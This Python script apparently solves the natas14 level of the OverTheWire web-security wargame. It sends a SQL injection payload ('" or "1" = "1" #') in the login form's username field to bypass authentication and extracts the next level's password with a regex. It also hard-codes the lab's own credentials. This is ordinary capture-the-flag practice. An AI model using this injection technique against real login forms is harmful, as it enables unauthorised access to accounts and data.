#Import Library
import requests
import re
import base64

#Setting variables needed
username = 'natas14'
password = 'Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1'

url = f'http://{username}.natas.labs.overthewire.org/'
#Set the payload up
payloads={"username":'Hello" or "1" = "1" #',"password":"nothing", "submit":"Login"}

#Connect to natas
session = requests.Session()

response = session.request('POST', url, auth=(username,password), data=payloads)

#Filtering to get a password
#result = response.text
result = re.findall('Successful login! The password for natas15 is (.*)<br>', response.text)[0]

print(result)
